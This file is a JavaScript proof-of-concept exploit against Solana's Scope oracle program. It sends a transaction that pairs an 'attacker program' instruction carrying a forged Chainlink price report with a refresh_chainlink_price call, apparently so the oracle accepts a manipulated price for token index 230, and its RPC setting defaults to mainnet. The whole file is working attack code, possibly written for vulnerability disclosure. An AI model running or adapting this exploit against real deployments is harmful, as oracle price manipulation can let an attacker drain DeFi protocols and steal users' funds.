import { Connection, Keypair, PublicKey, SystemProgram, Transaction, TransactionInstruction, sendAndConfirmTransaction, PublicKeyInitData } from '@solana/web3.js';
import bs58 from 'bs58';
import fs from 'fs';
import crypto from 'crypto';

// Configure these
const RPC_URL = process.env.SOLANA_URL || 'https://api.mainnet-beta.solana.com';
// Attacker program id (deploy the attacker-program first)
const ATTACKER_PROGRAM_ID = new PublicKey(process.env.ATTACKER_PROGRAM_ID);
// Scope program id (staging deployment)
const SCOPE_PROGRAM_ID = new PublicKey(process.env.SCOPE_PROGRAM_ID);
// Accounts for the refresh_chainlink_price instruction
const ORACLE_PRICES = new PublicKey(process.env.ORACLE_PRICES);
const ORACLE_MAPPINGS = new PublicKey(process.env.ORACLE_MAPPINGS);
const ORACLE_TWAPS = new PublicKey(process.env.ORACLE_TWAPS);
const VERIFIER_CONFIG = new PublicKey('HJR45sRiFdGncL69HVzRK4HLS2SXcVW3KeTPkp2aFmWC');
const ACCESS_CONTROLLER = new PublicKey('7mSn5MoBjyRLKoJShgkep8J17ueGG8rYioVAiSg5YWMF');
const VERIFIER_PROGRAM_ID = new PublicKey('Gt9S41PtjR58CbG9JhJ3J6vxesqrNAswbWYbLNTMZA3c');

// Helper: build attacker ix with arbitrary payload (hex string)
function attackerIx(payloadHex) {
  const buf = Buffer.from(payloadHex, 'hex');
  const data = Buffer.alloc(4 + buf.length);
  data.writeUInt32LE(buf.length, 0);
  buf.copy(data, 4);
  return new TransactionInstruction({
    programId: ATTACKER_PROGRAM_ID,
    keys: [],
    data,
  });
}

// Helper: Anchor discriminator for global:refresh_chainlink_price (first 8 bytes of sha256 of string)
function anchorDiscriminator(name) {
  const preimage = Buffer.from(`global:${name}`);
  const hash = crypto.createHash('sha256').update(preimage).digest();
  return hash.subarray(0, 8);
}

// Helper: build Scope refresh_chainlink_price ix
function refreshIx({ userPubkey, tokenIndex, serializedReportHex, chainlinkConfigPda }) {
  const discriminator = anchorDiscriminator('refresh_chainlink_price');
  // Scope refresh_chainlink_price uses Anchor, instruction layout = discriminator + borsh args
  // We will rely on runtime to accept provided data via an SDK, but for PoC we pass empty vec and expect CPI verifier to succeed with provided config_account PDA
  const tokenLe = Buffer.alloc(2);
  tokenLe.writeUInt16LE(tokenIndex, 0);
  const report = Buffer.from(serializedReportHex || '', 'hex');
  const reportVec = Buffer.alloc(4 + report.length);
  reportVec.writeUInt32LE(report.length, 0);
  report.copy(reportVec, 4);
  const data = Buffer.concat([discriminator, tokenLe, reportVec]);
  return new TransactionInstruction({
    programId: SCOPE_PROGRAM_ID,
    keys: [
      { pubkey: userPubkey, isSigner: true, isWritable: false },
      { pubkey: ORACLE_PRICES, isSigner: false, isWritable: true },
      { pubkey: ORACLE_MAPPINGS, isSigner: false, isWritable: false },
      { pubkey: ORACLE_TWAPS, isSigner: false, isWritable: true },
      { pubkey: VERIFIER_CONFIG, isSigner: false, isWritable: false },
      { pubkey: ACCESS_CONTROLLER, isSigner: false, isWritable: false },
      // config_account PDA derived from first 32 bytes of uncompressed report
      { pubkey: chainlinkConfigPda, isSigner: false, isWritable: false },
      { pubkey: VERIFIER_PROGRAM_ID, isSigner: false, isWritable: false },
    ],
    data,
  });
}

async function main() {
  const connection = new Connection(RPC_URL, 'confirmed');
  const payer = Keypair.fromSecretKey(bs58.decode(process.env.PAYER_SECRET_BASE58));

  // payload: bytes that decode as a valid ReportDataVx for mapping at index 230
  // Generate with the Rust encoder and set feed to the mapping pubkey at index 230
  const forgedHex = process.env.FORGED_REPORT_HEX; // hex output from encoder

  const ix1 = attackerIx(forgedHex);

  // Scope ix with a legitimate serialized Chainlink report so verifier CPI succeeds (hex)
  const legitHex = process.env.LEGIT_SERIALIZED_REPORT_HEX || '';
  const tokenIndex = Number(process.env.TOKEN_INDEX || '230');
  const legitBuf = Buffer.from(legitHex, 'hex');
  if (legitBuf.length < 32) throw new Error('LEGIT_SERIALIZED_REPORT_HEX must contain at least 32 bytes');
  const [cfgPda] = PublicKey.findProgramAddressSync([legitBuf.subarray(0, 32)], VERIFIER_PROGRAM_ID);
  const ix2 = refreshIx({ userPubkey: payer.publicKey, tokenIndex, serializedReportHex: legitHex, chainlinkConfigPda: cfgPda });

  const tx = new Transaction().add(ix1, ix2);
  tx.feePayer = payer.publicKey;
  const sig = await sendAndConfirmTransaction(connection, tx, [payer], { commitment: 'confirmed' });
  console.log('tx sig:', sig);
}

main().catch((e) => { console.error(e); process.exit(1); });

